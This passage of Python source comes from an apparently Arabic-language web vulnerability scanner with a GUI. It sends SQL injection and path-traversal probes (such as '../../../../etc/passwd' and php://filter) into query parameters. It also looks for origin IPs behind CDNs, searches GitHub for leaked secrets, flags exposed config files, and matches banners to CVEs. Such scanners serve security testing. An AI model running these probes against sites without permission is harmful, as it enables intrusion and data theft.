            r = self.s.get(url, timeout=3)
            pus = re.findall(r'href=["\']([^"\']*\?[^"\']+)["\']', r.text)
            tus = list(set([url+'?id=1',url+'?page=1'] + [urljoin(url, l) for l in pus[:4]]))
            for tu in tus:
                if '=' not in urlparse(tu).query: continue
                for pm in urlparse(tu).query.split('&'):
                    if '=' not in pm: continue
                    pn, pv = pm.split('=', 1)
                    for pl, pt in plds:
                        try:
                            rr = self.s.get(tu.replace(f"{pn}={pv}", f"{pn}={pl}"), timeout=1)
                            for er in errs:
                                if er in rr.text.lower(): results.append({'pm':pn,'pl':pl,'tp':pt,'ev':er}); break
                        except: pass
        except: pass
        seen = set(); return [r for r in results if (k:=f"{r['pm']}-{r['tp']}") not in seen and not seen.add(k)]

    def lfi(self, url):
        results = []
        url = self.norm(url)
        plds = [
            ("../../../../etc/passwd", "linux_passwd"),
            ("....//....//etc/passwd", "bypass"),
            ("..\\..\\..\\windows\\win.ini", "windows_ini"),
        ]
        # php://filter نتركه لكن نتحقق من base64
        php_filter = "php://filter/convert.base64-encode/resource=index.php"

        # علامات مؤكدة — لازم تكون واضحة جداً
        strong_signs = {
            'linux_passwd': [
                'root:x:0:0',
                'daemon:x:',
                'bin:x:',
                '/bin/bash',
                '/bin/sh',
                'nobody:x:',
            ],
            'windows_ini': [
                '[extensions]',
                '[fonts]',
                'MAPI=1',
            ],
            'bypass': [
                'root:x:0:0',
                'daemon:x:',
                '/bin/bash',
            ],
            'php_filter': [
                'PD9waHA',   # base64 لـ <?php
                'PD9QSA',
                'PCFET0NUW', # base64 لـ <!DOC
            ],
        }

        try:
            r = self.s.get(url, timeout=3)
            pus = re.findall(
                r'href=["\']([^"\']*\?[^"\']+)["\']', r.text)
            tus = list(set(
                [url + '?file=test', url + '?page=test',
                 url + '?path=test', url + '?include=test'] +
                [urljoin(url, l) for l in pus[:3]]))

            for tu in tus:
                if '=' not in urlparse(tu).query:
                    continue
                for pm in urlparse(tu).query.split('&'):
                    if '=' not in pm:
                        continue
                    pn, pv = pm.split('=', 1)
                    if pn.lower() not in [
                            'file', 'page', 'path', 'include',
                            'lang', 'template', 'doc', 'view',
                            'content', 'load']:
                        continue

                    # فحص payloads عادية
                    for pl, pt in plds:
                        try:
                            rr = self.s.get(
                                tu.replace(f"{pn}={pv}",
                                           f"{pn}={pl}"),
                                timeout=1.5)
                            body = rr.text

                            # تحقق من علامات قوية فقط
                            for sign in strong_signs.get(pt, []):
                                if sign in body:
                                    results.append({
                                        'pm': pn,
                                        'pl': pl,
                                        'tp': pt,
                                        'ev': sign
                                    })
                                    break
                        except:
                            pass

                    # فحص php://filter بشكل منفصل
                    try:
                        rr = self.s.get(
                            tu.replace(f"{pn}={pv}",
                                       f"{pn}={php_filter}"),
                            timeout=1.5)
                        body = rr.text

                        # لازم يكون base64 فعلي
                        for sign in strong_signs['php_filter']:
                            if sign in body:
                                results.append({
                                    'pm': pn,
                                    'pl': php_filter,
                                    'tp': 'php_filter',
                                    'ev': f"base64 detected: {sign}"
                                })
                                break
                    except:
                        pass

        except:
            pass

        # إزالة تكرار
        seen = set()
        unique = []
        for r in results:
            k = f"{r['pm']}-{r['tp']}"
            if k not in seen:
                seen.add(k)
                unique.append(r)
        return unique

    def cdn_bypass(self, d):
        result = {
            'web_ips': [],    # IP محتمل للموقع
            'mail_ips': [],   # IP البريد
            'other_ips': [],  # IPs ثانية
            'methods': []
        }
        ci = ''  # IP الـ CDN الحالي

        # نجيب IP الدومين الرئيسي
        try:
            j = requests.get(
                f"https://dns.google/resolve?name={d}&type=A",
                timeout=3).json()
            ci = j.get('Answer', [{}])[0].get('data', '')
        except:
            pass

        # قائمة subdomains مع تصنيفهن
        mail_subs = ['mail', 'smtp', 'pop', 'imap', 'mx',
                     'email', 'webmail', 'ftp']
        web_subs = ['direct', 'origin', 'www', 'cpanel',
                    'old', 'dev', 'staging', 'api', 'app']

        all_subs = mail_subs + web_subs

        for sub in all_subs:
            try:
                full = f"{sub}.{d}"
                ip = socket.gethostbyname(full)

                # تجاهل إذا نفس IP مال CDN
                if ip == ci:
                    continue

                # فحص إذا IP مال CDN ثاني
                try:
                    geo = requests.get(
                        f"http://ip-api.com/json/{ip}",
                        timeout=2).json()
                    isp = geo.get('isp', '').lower()
                    is_cdn = any(c in isp for c in
                                 ['cloudflare', 'akamai', 'fastly',
                                  'incapsula', 'sucuri'])
                    if is_cdn:
                        continue
                    country = geo.get('country', '')
                    city = geo.get('city', '')
                except:
                    country = ''
                    city = ''
                    is_cdn = False

                # تصنيف IP
                entry = {
                    'ip': ip,
                    'sub': full,
                    'country': country,
                    'city': city,
                }

                if ip not in [x['ip'] for x in
                              result['web_ips'] +
                              result['mail_ips'] +
                              result['other_ips']]:
                    if sub in mail_subs:
                        result['mail_ips'].append(entry)
                    elif sub in web_subs:
                        result['web_ips'].append(entry)
                    else:
                        result['other_ips'].append(entry)

                    result['methods'].append(f"{full}→{ip}")

            except:
                pass

        # فحص SPF للحصول على IPs إضافية
        try:
            spf = requests.get(
                f"https://dns.google/resolve?name={d}&type=TXT",
                timeout=3).json()
            for ans in spf.get('Answer', []):
                txt = ans.get('data', '')
                for found_ip in re.findall(
                        r'ip4:(\d+\.\d+\.\d+\.\d+)', txt):
                    if found_ip != ci and found_ip not in [
                            x['ip'] for x in
                            result['web_ips'] +
                            result['mail_ips'] +
                            result['other_ips']]:
                        try:
                            geo = requests.get(
                                f"http://ip-api.com/json/{found_ip}",
                                timeout=2).json()
                            isp = geo.get('isp', '').lower()
                            if not any(c in isp for c in
                                       ['cloudflare', 'akamai', 'fastly']):
                                result['other_ips'].append({
                                    'ip': found_ip,
                                    'sub': 'SPF record',
                                    'country': geo.get('country', ''),
                                    'city': geo.get('city', ''),
                                })
                                result['methods'].append(
                                    f"SPF→{found_ip}")
                        except:
                            pass
        except:
            pass

        return result

    def github(self, d):
        results = []
        for q in [f'"{d}" password', f'"{d}" secret', f'"{d}" api_key']:
            try:
                r = requests.get(f"https://api.github.com/search/code?q={q}", timeout=4,
                    headers={'Accept': 'application/vnd.github.v3+json'})
                if r.status_code == 200:
                    c = r.json().get('total_count', 0)
                    if c > 0: results.append({'q':q,'c':c,'u':f"https://github.com/search?q={q.replace(' ','+')}&type=code"})
                elif r.status_code == 403: results.append({'q':q,'c':-1,'u':'Rate limit'}); break
            except: pass
            time.sleep(0.8)
        return results

    def wayback(self, d):
        results = {'urls':[],'int':[]}; seen = set()
        try:
            resp = requests.get(
                f"https://web.archive.org/cdx/search/cdx?url=*.{d}/*&output=json&collapse=urlkey&limit=150&fl=original,statuscode,timestamp",
                timeout=12)
            if resp.status_code == 200:
                data = resp.json()
                for row in data[1:] if len(data) > 1 else []:
                    url = row[0] if len(row) > 0 else ''; ts = row[2] if len(row) > 2 else ''
                    if not url or url in seen: continue
                    seen.add(url); results['urls'].append(url)
                    for kw in ['.sql','.zip','.bak','password','config','.env','backup','database',
                               'secret','phpinfo','wp-config','debug','.log','dump','credential','phpmyadmin']:
                        if kw in url.lower():
                            results['int'].append({'url':url,'kw':kw,'arc':f"https://web.archive.org/web/{ts}/{url}"}); break
        except: pass
        results['int'] = results['int'][:20]; return results

    def dorks(self, d):
        return [f'site:{d}', f'site:{d} filetype:sql', f'site:{d} inurl:admin',
                f'site:{d} intitle:"index of"', f'site:{d} intext:"password"',
                f'"{d}" site:github.com']

    def gen_html(self, domain, text, score, grade):
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        sc = '#00ff41' if score>=80 else '#ffaa00' if score>=60 else '#ff8844' if score>=40 else '#ff4444'
        safe = text.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
        return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>JAFAR — {domain}</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{background:#000a00;color:#00ff41;font-family:Consolas,monospace;font-size:14px;padding:20px}}
.h{{background:linear-gradient(135deg,#001a00,#000a00);border:2px solid #00ff41;border-radius:12px;padding:25px;margin-bottom:20px;text-align:center}}
.h h1{{color:#00ff41;font-size:28px}}.h .t{{color:#00aa30;font-size:18px}}
.s{{background:#001500;border:3px solid {sc};border-radius:15px;padding:30px;margin:20px 0;text-align:center}}
.s .n{{font-size:72px;font-weight:bold;color:{sc}}}.s .g{{font-size:24px;color:{sc}}}
.b{{background:#000d00;border:1px solid #003300;border-radius:8px;padding:20px;margin:15px 0}}
.b pre{{white-space:pre-wrap;color:#00cc33;line-height:1.6}}
.f{{text-align:center;padding:20px;color:#005500}}</style></head><body>
<div class="h"><h1>🔍 JAFAR ALSADIQ v4.0</h1><div class="t">🎯 {domain}</div></div>
<div class="s"><div class="n">{score}/100</div><div class="g">{grade}</div></div>
<div class="b"><pre>{safe}</pre></div>
<div class="f">JAFAR ALSADIQ — {ts}</div></body></html>"""

    def score(self, http, sh, ssl_v, ports, fuzz,
              cves=None, sqli=None, lfi=None,
              has_spf=False, has_dmarc=False):
        sc = 100
        iss = []
        rec = []

        # ─── SSL ───
        if not ssl_v.get('valid'):
            sc -= 15
            iss.append(('🔴', 'SSL مفقود'))
            rec.append("Let's Encrypt مجاني")

        # ─── Security Headers ───
        # لا تخصم على headers إذا الرد 403 من Cloudflare
        blocked_by_waf = (
            http.get('status') == 403 and
            http.get('waf') == 'Cloudflare'
        )

        if not blocked_by_waf:
            for h, d in sh.items():
                if not d['p']:
                    sc -= (8 if d['s'] == 'عالي' else 3)
                    iss.append(('🔴' if d['s'] == 'عالي' else '🟡',
                                f'{h} مفقود'))
        else:
            iss.append(('🟡', 'تعذر تقييم Security Headers بسبب 403 من Cloudflare'))

        # ─── WAF ───
        if http.get('waf') == 'لا يوجد':
            # إذا الـ IP تابع لـ Cloudflare — فعليًا عنده WAF
            ip = http.get('ip', '')
            cf_ranges = [
                '104.16.','104.17.','104.18.','104.19.',
                '104.20.','104.21.','172.64.','172.65.',
                '172.66.','172.67.','162.158.','198.41.',
            ]
            actually_has_waf = any(
                ip.startswith(p) for p in cf_ranges)
            if not actually_has_waf:
                sc -= 10
                iss.append(('🔴', 'لا WAF'))
                rec.append('Cloudflare مجاني')

        # ─── Server Version ───
        if '/' in http.get('server', ''):
            sc -= 5
            iss.append(('🟡', f'إصدار مكشوف: {http["server"]}'))
            rec.append('أخفِ إصدار السيرفر')

        # ─── Dangerous Ports ───
        for p in ports:
            if p.get('d'):
                sc -= 10
                iss.append(('🔴',
                            f"بورت {p['p']} ({p['sv']}) مفتوح!"))
                rec.append(f"أغلق بورت {p['p']}")

        # ─── Sensitive Files ───
        sens = ['.env', '.git', 'backup', 'phpmyadmin', 'phpinfo',
                'wp-config', 'credentials', 'id_rsa',
                'CHANGELOG', 'settings.php']
        for f in fuzz:
            for s in sens:
                if s in f['p'].lower() and f['st'] in [200, 301, 302]:
                    sc -= 10
                    iss.append(('🔴', f"{f['p']} مكشوف!"))
                    rec.append(f"احذف أو احمِ {f['p']}")
                    break

        # ─── SPF ───
        if not has_spf:
            sc -= 5
            iss.append(('🟡', 'SPF مفقود — البريد قابل للتزوير'))
            rec.append('أضف SPF record للدومين')

        # ─── DMARC ───
        if not has_dmarc:
            sc -= 5
            iss.append(('🟡', 'DMARC مفقود — حماية بريد ضعيفة'))
            rec.append('أضف DMARC record للدومين')

        # ─── CVE ───
        if cves:
            critical = [c for c in cves if c.get('s') == 'حرج']
            high = [c for c in cves if c.get('s') == 'عالي']
            medium = [c for c in cves if c.get('s') == 'متوسط']
            sc -= len(critical) * 8
            sc -= len(high) * 4
            sc -= len(medium) * 1
            if critical:
                iss.append(('🔴',
                            f"{len(critical)} CVE حرجة مكتشفة"))
                rec.append('حدّث النظام فوراً')
            if high:
                iss.append(('🟠',
                            f"{len(high)} CVE عالية الخطورة"))

        # ─── SQLi ───
        if sqli:
            sc -= 15
            iss.append(('🔴',
                        f"SQL Injection مكتشف ({len(sqli)} ثغرة)"))
            rec.append('أصلح استعلامات SQL فوراً')

        # ─── LFI ───
        if lfi:
            sc -= 15
            iss.append(('🔴',
                        f"LFI مكتشف ({len(lfi)} ثغرة)"))
            rec.append('أصلح قراءة الملفات فوراً')

        return max(0, min(100, sc)), iss, rec
        
    def get_versions(self, url, body):
        versions = {}
        if not body:
            return versions

        # ─── WordPress ───
        patterns_wp = [
            r'content="WordPress\s+([\d.]+)"',
            r'<meta[^>]+generator[^>]+WordPress\s+([\d.]+)',
            r'wp-includes[^"\']*\?ver=([\d.]+)',
            r'wp-content[^"\']*\?ver=([\d.]+)',
        ]
        for pt in patterns_wp:
            m = re.search(pt, body, re.I)
            if m:
                versions['wordpress'] = m.group(1)
                break

        # جرب أيضاً جلب WP version من wp-json
        if 'wordpress' not in versions:
            try:
                dom = urlparse(url).netloc
                r = self.s.get(f"http://{dom}/wp-json/", timeout=3)
                if r.status_code == 200:
                    data = r.json()
                    gmt = data.get('gmt_offset')
                    ver = data.get('generator', '')
                    m = re.search(r'WordPress/([\d.]+)', ver)
                    if m:
                        versions['wordpress'] = m.group(1)
            except:
                pass

        # ─── jQuery ───
        patterns_jq = [
            r'jquery[.-]([\d]+\.[\d]+\.[\d]+)(?:\.min)?\.js',
            r'jquery/?([\d]+\.[\d]+\.[\d]+)/jquery',
            r'\bjQuery\s+v([\d]+\.[\d]+\.[\d]+)\b',
            r'"jquery"\s*:\s*"([\d]+\.[\d]+\.[\d]+)"',
        ]
        for pt in patterns_jq:
            m = re.search(pt, body, re.I)
            if m:
                versions['jquery'] = m.group(1)
                break

        # ─── PHP ───
        m = re.search(r'PHP/([\d]+\.[\d]+\.[\d]+)', body, re.I)
        if m:
            versions['php'] = m.group(1)

        # ─── Apache ───
        m = re.search(r'Apache/([\d]+\.[\d]+\.[\d]+)', body, re.I)
        if m:
            versions['apache'] = m.group(1)

        # ─── Nginx ───
        m = re.search(r'nginx/([\d]+\.[\d]+\.[\d]+)', body, re.I)
        if m:
            versions['nginx'] = m.group(1)

        # ─── OpenSSH ───
        m = re.search(r'OpenSSH[_-]([\d]+\.[\d]+)', body, re.I)
        if m:
            versions['openssh'] = m.group(1)

        # ─── Drupal ───
        patterns_dr = [
            r'Drupal\s+([\d]+\.[\d]+)',
            r'"drupal"[^}]*"version"\s*:\s*"([\d]+\.[\d]+)',
        ]
        for pt in patterns_dr:
            m = re.search(pt, body, re.I)
            if m:
                versions['drupal'] = m.group(1)
                break

        # ─── Bootstrap ───
        m = re.search(r'bootstrap[.-]([\d]+\.[\d]+\.[\d]+)(?:\.min)?\.(?:js|css)', body, re.I)
        if m:
            versions['bootstrap'] = m.group(1)

        return versions

    def compare_version(self, current, maximum):
        """
        True = current <= maximum (يعني vulnerable)
        False = current > maximum (يعني محدّث)
        None = ما عرف يقارن
        """
        try:
            def parse(v):
                parts = str(v).split('.')
                result = []
                for p in parts[:3]:
                    try:
                        result.append(int(p))
                    except:
                        result.append(0)
                while len(result) < 3:
                    result.append(0)
                return result

            c = parse(current)
            m = parse(maximum)
            return c <= m
        except:
            return None  # إذا ما عرف يقارن = يعتبر vulnerable

    def match_cve(self, http, ports, banners=None):
        findings = []
        server = http.get('server', '').lower()
        xpb = http.get('xpb', '').lower()
        gen = http.get('gen', '').lower()
        cms = http.get('cms', '').lower()
        tech = [t.lower() for t in http.get('tech', [])]
        body = http.get('body', '')
        at = f"{server} {xpb} {gen} {' '.join(tech)}"
        if banners:
            for b in banners: at += f" {b.get('b','').lower()}"

        # كشف الإصدارات الفعلية
        url = http.get('url', '')
        versions = self.get_versions(url, body + at)

        def vuln(name, max_ver):
            """هل الإصدار المكتشف أقل من أو يساوي max_ver؟"""
            v = versions.get(name)
            if not v:
                return True   # إذا ما عرف الإصدار = يبلغ
            return self.compare_version(v, max_ver)

        cve_db = [
            # ══ APACHE ══
            {'m':'apache/2.4.49','c':'CVE-2021-41773','s':'حرج','cvss':9.8,
             'd':'Path Traversal + RCE','ver_check':lambda: 'apache/2.4.49' in at},
            {'m':'apache/2.4.50','c':'CVE-2021-42013','s':'حرج','cvss':9.8,
             'd':'Path Traversal','ver_check':lambda: 'apache/2.4.50' in at},
            {'m':'apache/2.4.','c':'CVE-2023-25690','s':'حرج','cvss':9.8,
             'd':'HTTP Request Smuggling mod_proxy',
             'ver_check':lambda: 'apache/2.4.' in at},
            {'m':'apache/2.2.','c':'CVE-2017-9798','s':'متوسط','cvss':7.5,
             'd':'Optionsbleed','ver_check':lambda: 'apache/2.2.' in at},

            # ══ NGINX ══
            {'m':'nginx/1.','c':'CVE-2021-23017','s':'عالي','cvss':7.7,
             'd':'DNS Resolver Buffer Overflow',
             'ver_check':lambda: 'nginx/1.' in at},

            # ══ PHP ══
            {'m':'php/5.','c':'CVE-2019-11043','s':'حرج','cvss':9.8,
             'd':'PHP-FPM RCE','ver_check':lambda: vuln('php','5.99.99')},
            {'m':'php/7.0','c':'CVE-2019-11043','s':'حرج','cvss':9.8,
             'd':'PHP-FPM RCE','ver_check':lambda: vuln('php','7.0.99')},
            {'m':'php/7.1','c':'CVE-2019-11043','s':'حرج','cvss':9.8,
             'd':'PHP 7.1 EOL + RCE','ver_check':lambda: vuln('php','7.1.99')},
            {'m':'php/7.2','c':'CVE-2019-11043','s':'حرج','cvss':9.8,
             'd':'PHP 7.2 EOL','ver_check':lambda: vuln('php','7.2.99')},
            {'m':'php/7.3','c':'CVE-2021-21705','s':'متوسط','cvss':5.3,
             'd':'PHP 7.3 SSRF','ver_check':lambda: vuln('php','7.3.99')},
            {'m':'php/7.4','c':'CVE-2023-3247','s':'متوسط','cvss':5.9,
             'd':'PHP 7.4 EOL','ver_check':lambda: vuln('php','7.4.99')},
            {'m':'php/8.0','c':'CVE-2023-0568','s':'متوسط','cvss':6.5,
             'd':'PHP 8.0 EOL','ver_check':lambda: vuln('php','8.0.99')},
            {'m':'php/8.1','c':'CVE-2024-4577','s':'حرج','cvss':9.8,
             'd':'CGI Argument Injection',
             'ver_check':lambda: vuln('php','8.1.29')},
            {'m':'php/8.2','c':'CVE-2024-2756','s':'منخفض','cvss':3.7,
             'd':'Cookie bypass','ver_check':lambda: vuln('php','8.2.17')},

            # ══ WORDPRESS ══
            {'m':'wordpress','c':'CVE-2019-8942','s':'حرج','cvss':9.8,
             'd':'WP RCE via image upload',
             'ver_check':lambda: vuln('wordpress','5.0.1')},
            {'m':'wordpress','c':'CVE-2023-2745','s':'متوسط','cvss':6.4,
             'd':'WP Directory Traversal',
             'ver_check':lambda: vuln('wordpress','6.2.1')},
            {'m':'wordpress','c':'CVE-2021-29447','s':'متوسط','cvss':6.5,
             'd':'WordPress XXE عبر الوسائط',
             'ver_check':lambda: vuln('wordpress','5.7.1')},
            {'m':'wordpress','c':'CVE-2022-21663','s':'متوسط','cvss':6.5,
             'd':'WordPress SQLi Object Injection',
             'ver_check':lambda: vuln('wordpress','5.8.3')},
            {'m':'wordpress','c':'CVE-2023-39999','s':'متوسط','cvss':4.3,
             'd':'WordPress XSS',
             'ver_check':lambda: vuln('wordpress','6.3.2')},
            {'m':'wordpress','c':'CVE-2020-28037','s':'متوسط','cvss':5.3,
             'd':'XML-RPC BF + DDoS',
             'ver_check':lambda: 'wordpress' in at},

            # ══ DRUPAL ══
            {'m':'drupal','c':'CVE-2018-7600','s':'حرج','cvss':9.8,
             'd':'Drupalgeddon2 RCE',
             'ver_check':lambda: 'drupal' in at},
            {'m':'drupal','c':'CVE-2018-7602','s':'حرج','cvss':9.8,
             'd':'Drupalgeddon3 RCE',
             'ver_check':lambda: 'drupal' in at},
            {'m':'drupal','c':'CVE-2019-6340','s':'حرج','cvss':9.8,
             'd':'Drupal REST RCE',
             'ver_check':lambda: 'drupal' in at},

            # ══ JOOMLA ══
            {'m':'joomla','c':'CVE-2023-23752','s':'عالي','cvss':7.5,
             'd':'Joomla API Leak',
             'ver_check':lambda: 'joomla' in at},
            {'m':'joomla','c':'CVE-2024-21726','s':'حرج','cvss':9.8,
             'd':'Joomla XSS→RCE',
             'ver_check':lambda: 'joomla' in at},

            # ══ JQUERY — مع تحقق إصدار دقيق ══
            {'m':'jquery','c':'CVE-2020-11023','s':'متوسط','cvss':6.1,
             'd':'jQuery < 3.5.0 XSS',
             'ver_check':lambda: (
                 'jquery' in versions and
                 vuln('jquery','3.4.99'))},
            {'m':'jquery','c':'CVE-2019-11358','s':'متوسط','cvss':6.1,
             'd':'jQuery < 3.4.0 Prototype Pollution',
             'ver_check':lambda: (
                 'jquery' in versions and
                 vuln('jquery','3.3.99'))},
            {'m':'jquery 1.','c':'CVE-2015-9251','s':'متوسط','cvss':6.1,
             'd':'jQuery 1.x XSS',
             'ver_check':lambda: (
                 'jquery' in versions and
                 vuln('jquery','1.99.99'))},

            # ══ BOOTSTRAP — مع تحقق إصدار ══
            {'m':'bootstrap','c':'CVE-2018-14040','s':'متوسط','cvss':6.1,
             'd':'Bootstrap < 4.1.2 XSS',
             'ver_check':lambda: vuln('bootstrap','4.1.1')},

            # ══ LARAVEL ══
            {'m':'laravel','c':'CVE-2021-3129','s':'حرج','cvss':9.8,
             'd':'Laravel Debug Mode RCE',
             'ver_check':lambda: 'laravel' in at},

            # ══ DJANGO ══
            {'m':'django','c':'CVE-2022-28347','s':'حرج','cvss':9.8,
             'd':'Django SQLi',
             'ver_check':lambda: 'django' in at},

            # ══ MOODLE ══
            {'m':'moodle','c':'CVE-2024-43425','s':'حرج','cvss':9.8,
             'd':'Moodle 2024 RCE',
             'ver_check':lambda: 'moodle' in at},

            # ══ OPENSSH — مع تحقق إصدار ══
            {'m':'openssh_7.','c':'CVE-2018-15473','s':'متوسط','cvss':5.3,
             'd':'OpenSSH 7.x Username Enumeration',
             'ver_check':lambda: vuln('openssh','7.99.99')},
            {'m':'openssh_8.','c':'CVE-2023-38408','s':'حرج','cvss':9.8,
             'd':'OpenSSH 8.x PKCS#11 RCE',
             'ver_check':lambda: vuln('openssh','8.99.99')},
            {'m':'openssh_9.','c':'CVE-2024-6387','s':'حرج','cvss':9.8,
             'd':'regreSSHion RCE',
             'ver_check':lambda: vuln('openssh','9.7.99')},

            # ══ FTP ══
            {'m':'proftpd','c':'CVE-2019-12815','s':'حرج','cvss':9.8,
             'd':'ProFTPD mod_copy RCE',
             'ver_check':lambda: 'proftpd' in at},
            {'m':'vsftpd 2.3.4','c':'CVE-2011-2523','s':'حرج','cvss':10.0,
             'd':'vsftpd 2.3.4 Backdoor!',
             'ver_check':lambda: 'vsftpd 2.3.4' in at},

            # ══ MAIL ══
            {'m':'postfix','c':'CVE-2023-51764','s':'متوسط','cvss':5.3,
             'd':'Postfix SMTP Smuggling',
             'ver_check':lambda: 'postfix' in at},
            {'m':'exim','c':'CVE-2019-10149','s':'حرج','cvss':9.8,
             'd':'Exim RCE WIZard',
             'ver_check':lambda: 'exim' in at},

            # ══ DATABASE ══
            {'m':'mysql','c':'CVE-2023-22078','s':'عالي','cvss':7.7,
             'd':'MySQL مكشوف للإنترنت',
             'ver_check':lambda: 'mysql' in at},
            {'m':'mariadb','c':'CVE-2022-32081','s':'عالي','cvss':7.5,
             'd':'MariaDB Use-after-poison',
             'ver_check':lambda: 'mariadb' in at},

            # ══ IIS ══
            {'m':'microsoft-iis/6','c':'CVE-2017-7269','s':'حرج','cvss':9.8,
             'd':'IIS 6.0 WebDAV RCE',
             'ver_check':lambda: 'microsoft-iis/6' in at},
            {'m':'microsoft-iis/10','c':'CVE-2022-21907','s':'حرج','cvss':9.8,
             'd':'IIS 10 HTTP Protocol Stack RCE',
             'ver_check':lambda: 'microsoft-iis/10' in at},

            # ══ TOMCAT ══
            {'m':'tomcat','c':'CVE-2020-1938','s':'حرج','cvss':9.8,
             'd':'Ghostcat AJP RCE',
             'ver_check':lambda: 'tomcat' in at},

            # ══ LOG4J ══
            {'m':'log4j','c':'CVE-2021-44228','s':'حرج','cvss':10.0,
             'd':'Log4Shell JNDI Injection RCE',
             'ver_check':lambda: 'log4j' in at},

            # ══ REDIS ══
            {'m':'redis','c':'CVE-2022-0543','s':'حرج','cvss':10.0,
             'd':'Redis Lua Sandbox Escape RCE',
             'ver_check':lambda: 'redis' in at},

            # ══ PLUGINS ══
            {'m':'revslider','c':'CVE-2014-9734','s':'حرج','cvss':9.8,
             'd':'Revolution Slider File Upload RCE',
             'ver_check':lambda: 'revslider' in at},
            {'m':'contact-form-7','c':'CVE-2020-35489','s':'حرج','cvss':9.8,
             'd':'CF7 Unrestricted File Upload',
             'ver_check':lambda: 'contact-form-7' in at},
            {'m':'elementor','c':'CVE-2023-48777','s':'عالي','cvss':8.8,
             'd':'Elementor Authenticated RCE',
             'ver_check':lambda: 'elementor' in at},
            {'m':'woocommerce','c':'CVE-2023-28121','s':'حرج','cvss':9.8,
             'd':'WooCommerce Auth Bypass',
             'ver_check':lambda: 'woocommerce' in at},
            {'m':'litespeed','c':'CVE-2023-40000','s':'حرج','cvss':9.8,
             'd':'LiteSpeed Cache XSS→Admin',
             'ver_check':lambda: 'litespeed' in at},

            # ══ SPRING ══
            {'m':'spring','c':'CVE-2022-22965','s':'حرج','cvss':9.8,
             'd':'Spring4Shell RCE',
             'ver_check':lambda: 'spring' in at},

            # ══ MAGENTO ══
            {'m':'magento','c':'CVE-2024-34102','s':'حرج','cvss':9.8,
             'd':'Magento CosmicSting XXE→RCE',
             'ver_check':lambda: 'magento' in at},
        ]

        # فحص كل CVE مع ver_check
        for entry in cve_db:
            if entry['m'] not in at:
                continue
            try:
                if entry.get('ver_check') and not entry['ver_check']():
                    continue
            except:
                pass
            findings.append(entry)

        # بورتات خطرة
        for p in ports:
            port_vulns = {
                3306: {'m':'mysql','c':'CVE-2023-22078','s':'عالي',
                       'cvss':7.7,'d':'MySQL Port 3306 مكشوف'},
                5432: {'m':'postgresql','c':'CVE-2022-1552','s':'عالي',
                       'cvss':8.8,'d':'PostgreSQL مكشوف'},
                27017: {'m':'mongodb','c':'CVE-2019-2386','s':'متوسط',
                        'cvss':4.7,'d':'MongoDB مكشوف بلا مصادقة'},
                6379: {'m':'redis','c':'CVE-2022-0543','s':'حرج',
                       'cvss':10.0,'d':'Redis مكشوف — RCE محتمل'},
                9200: {'m':'elasticsearch','c':'CVE-2021-22145','s':'متوسط',
                       'cvss':4.3,'d':'Elasticsearch مكشوف'},
            }
            if p['p'] in port_vulns and p.get('d'):
                findings.append(port_vulns[p['p']])

        # CHANGELOG hint
        if 'changelog' in at.lower():
            findings.append({
                'm': 'info', 'c': 'INFO-001', 's': 'معلومات',
                'cvss': 0, 'd': 'CHANGELOG مكشوف يكشف إصدار CMS'})

        # إزالة تكرار وترتيب
        seen = set()
        unique = []
        for f in findings:
            if f['c'] not in seen:
                seen.add(f['c'])
                unique.append(f)

        sev_order = {'حرج':0,'عالي':1,'متوسط':2,'منخفض':3,'معلومات':4}
        unique.sort(key=lambda x: (sev_order.get(x['s'], 5),
                                    -x.get('cvss', 0)))
        return unique
        
# ===== JAFAR ALSADIQ v4.0 — Part 3: App =====

class App:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🔍 JAFAR ALSADIQ v4.0")
        self.root.geometry("1300x850")
        self.root.configure(bg="#000a00")
        self.eng = Engine()
        self.scanning = False
        self.start_time = None
        self.fullscreen = False
        self._build()
        self.root.bind("<F11>", self._toggle_fs)
        self.root.bind("<Escape>", self._exit_fs)

    def _toggle_fs(self, e=None):
        self.fullscreen = not self.fullscreen
        self.root.attributes("-fullscreen", self.fullscreen)

    def _exit_fs(self, e=None):
        self.fullscreen = False
        self.root.attributes("-fullscreen", False)

    def _build(self):
        hdr = tk.Frame(self.root, bg="#001500", height=52,
                        highlightbackground="#00ff41", highlightthickness=2)
        hdr.pack(fill="x", padx=8, pady=(8, 4))
        hdr.pack_propagate(False)
        tk.Label(hdr, text="🔍  JAFAR ALSADIQ v4.0",
                 font=("Arial", 19, "bold"), fg="#00ff41",
                 bg="#001500").pack(side="left", padx=18)
        self.st = tk.Label(hdr, text="● جاهز", font=("Consolas", 12),
                           fg="#00aa30", bg="#001500")
        self.st.pack(side="right", padx=18)
        self.timer = tk.Label(hdr, text="", font=("Consolas", 11),
                              fg="#008820", bg="#001500")
        self.timer.pack(side="right", padx=10)
        tk.Label(hdr, text="F11=شاشة كاملة | ESC=خروج",
                 font=("Consolas", 9), fg="#004400",
                 bg="#001500").pack(side="right", padx=10)

        inp = tk.Frame(self.root, bg="#001500",
                        highlightbackground="#006600", highlightthickness=2)
        inp.pack(fill="x", padx=8, pady=4)

        r1 = tk.Frame(inp, bg="#001500")
        r1.pack(fill="x", padx=14, pady=(12, 5))
        tk.Label(r1, text="🌐", font=("Arial", 15),
                 fg="#00ff41", bg="#001500").pack(side="left")
        self.url = tk.Entry(r1, font=("Consolas", 15), bg="#000d00",
                            fg="#00ff41", insertbackground="#00ff41",
                            relief="flat", bd=4,
                            highlightbackground="#00ff41", highlightthickness=2)
        self.url.pack(side="left", fill="x", expand=True, padx=8, ipady=6)
        self.url.bind("<Return>", lambda e: self._run())
        tk.Button(r1, text="  🔍 فحص  ", font=("Arial", 13, "bold"),
                  bg="#006600", fg="white", activebackground="#008800",
                  relief="flat", padx=14, pady=7, cursor="hand2",
                  command=self._run).pack(side="left", padx=6)

        r2 = tk.Frame(inp, bg="#001500")
        r2.pack(fill="x", padx=14, pady=(0, 12))
        tk.Label(r2, text="📁", font=("Arial", 14),
                 fg="#00aa30", bg="#001500").pack(side="left")
        self.wl = tk.Entry(r2, font=("Consolas", 12), bg="#000d00",
                           fg="#00cc33", insertbackground="#00ff41",
                           relief="flat", bd=4,
                           highlightbackground="#006600", highlightthickness=2)
        self.wl.pack(side="left", fill="x", expand=True, padx=8, ipady=4)
        self.wl.insert(0, "Wordlist — اختياري")
        self.wl.bind("<FocusIn>", lambda e: self.wl.delete(0, "end")
